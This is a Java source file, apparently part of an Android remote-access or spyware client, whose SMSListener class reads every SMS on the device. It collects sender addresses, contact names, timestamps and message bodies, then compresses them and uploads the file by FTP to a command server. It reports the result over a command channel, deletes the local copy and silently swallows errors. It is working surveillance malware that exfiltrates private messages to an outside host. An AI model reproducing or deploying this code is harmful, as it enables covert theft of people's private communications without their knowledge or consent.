package sub.app.func;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

import sub.app.client.SMSPacket;
import sub.app.client.SMSTreePacket;
import sub.app.client.StatusPacket;
import sub.app.entry.Protocol;
import sub.app.entry.TaskListener;

import android.database.Cursor;
import android.net.Uri;


public class SMSListener {

	//ClientListener ctx;
	//int channel;
	
	public static boolean listSMS(TaskListener c, int channel, byte[] args) {
		
		boolean ret = false;

		try{
			ArrayList<SMSPacket> l = new ArrayList<SMSPacket>();
	//		String WHERE_CONDITION = new String(args);
			String SORT_ORDER = "date DESC";
			String[] column = { "_id", "thread_id", "address", "person", "date","read" ,"body", "type" };
			String CONTENT_URI = "content://sms/"; //content://sms/inbox, content://sms/sent
			
			Cursor cursor = c.getContentResolver().query(Uri.parse(CONTENT_URI), column , null, null, SORT_ORDER);
			
	        if(cursor.getCount() != 0) {
		        cursor.moveToFirst();
		
		        do{
		           if(cursor.getColumnCount() != 0) {
		        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
		        	   int thid = cursor.getInt(cursor.getColumnIndex("thread_id"));
		        	   String add = cursor.getString(cursor.getColumnIndex("address"));
		        	   add = ContactsListener.appendContactName(c, add);
		        	   int person = cursor.getInt(cursor.getColumnIndex("person"));
	
		        	   long date  = cursor.getLong(cursor.getColumnIndex("date"));
		        	   Date dtTm = new Date(date);
		        	   SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat ( "yyyy.MM.dd HH:mm:ss", Locale.KOREA );  
		        	   String strTm = mSimpleDateFormat.format(dtTm);
		        	   
		        	   int read = cursor.getInt(cursor.getColumnIndex("read"));
		        	   String body = cursor.getString(cursor.getColumnIndex("body"));
		        	   int type = cursor.getInt(cursor.getColumnIndex("type"));
		        	   l.add(new SMSPacket(id, thid, add, person, strTm, read, body, type));
		           }
		        }while(cursor.moveToNext());
		        ret = true;
	        }
	        else
	        	ret = false;
	        
	        cursor.close();
	        cursor = null;
	        
	//		c.handleData(Protocol.OPCLIENT_SMS, channel, new SMSTreePacket(l).build());
	        byte[] raw = new SMSTreePacket(l).build();
	        byte[] data = Protocol.compress(raw);
	        if(data != null)
	        {
	    		String dirPath = c.getFilesDir() + "/dirsms";
	    		File smsF = new File(dirPath);
	    		if(smsF.exists() == false) smsF.mkdir();
	    		
	    		String fileName = "smslog.dat";
	
	    		smsF = new File(dirPath, fileName);
	    		smsF.delete();
	    		
	    	    try{
	    	    	smsF.createNewFile();
	    	    	FileOutputStream outStream = new FileOutputStream(smsF, true);
	    		    outStream.write(data);
	    		    outStream.flush();
	    		    outStream.close();
	    	    }catch(Exception e){
	    	    }
	    	    
	    	    data = null;
	    	    
	    	    System.gc();
	    		
	//    		c.sendFilePacket(Protocol.OPCLIENT_SMS, channel, smsF);
	    	    boolean success = false;
	    	    
				FtpManager ftpManager = new FtpManager();
				ftpManager.setAccount(Protocol.getServerIP(), FileDownloader.FTP_ID, FileDownloader.FTP_PW, c);
				if( ftpManager.FtpLogin() == true )
				{
					success = ftpManager.FtpUploadFile(smsF);
				}
				ftpManager.FtpLogout();
				ftpManager = null;
	
				StatusPacket packet = new StatusPacket(Protocol.STATUS_TYPE_FTPSMS, success, 0, 0, smsF.getName());
	    		c.handleData(Protocol.OPCLIENT_STATUS, channel, packet.build());
	
	    		smsF.delete();
	    		
	//          Log.d("info", "listSMS send success");        	
	        }
		}
		catch(Exception e)
		{
		}
        
		return ret;
	}
}
